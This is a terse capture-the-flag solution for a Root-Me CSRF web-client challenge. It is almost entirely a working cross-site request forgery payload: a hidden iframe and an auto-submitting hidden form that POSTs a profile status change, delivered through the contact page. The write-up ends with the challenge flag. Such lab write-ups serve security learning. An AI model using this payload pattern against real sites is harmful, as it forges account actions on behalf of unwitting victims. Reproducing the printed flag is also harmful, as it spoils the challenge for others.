/index.php?action=contact
```
<iframe style="display:none" name="csrf-frame"></iframe>
<form  id="csrf-form" target="csrf-frame" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
	<input type="hidden" name="username" value="user" />
	<input type="hidden" name="status" value="on" />
	<input type="submit" value="Submit" />
</form>
<script>document.getElementById("csrf-form").submit()</script>
```

/index.php?action=private
> Good job dude, flag is : Csrf_Fr33style-L3v3l1!
